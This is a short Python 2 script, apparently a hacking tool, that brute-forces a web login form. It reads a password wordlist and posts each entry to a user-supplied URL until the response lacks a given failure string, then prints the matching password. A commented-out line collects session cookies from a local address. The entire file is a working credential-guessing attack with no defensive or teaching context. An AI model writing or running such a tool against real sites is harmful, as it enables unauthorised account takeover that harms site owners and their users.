#!/usr/bin/env python
import requests,os

os.system("clear")
#change username:name password:name and other param:name
class bc:
    OKGREEN = '\033[92m'
    RED = '\033[91m'
    BOLD = '\033[1m'

#cookies
#s=requests.Session();c=s.get("http://10.0.2.2");ck=dict(c.cookies);cc = ck['_usse']

url = raw_input("Url post: ")
user = (raw_input("Enter ((formname:user)): ").strip()).split(":")
ter = raw_input("Invalid login response: ")
pswfile = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt";pswlines = open(pswfile, "r").readlines()

for psw in pswlines:
 password=psw.strip()
#,cookies=ck
 http = requests.post(url, data={"password":password,user[0]:user[1],"btnlogin":"az"})
 con = http.content
 if ter not in con:
  print bc.OKGREEN,bc.BOLD+("\n[*+*] Correct password: "+password+"   >>>>>>>>>>>>>>>>>.\n")
  break;
 else:
  print("[!!!] invalid password: "+password)
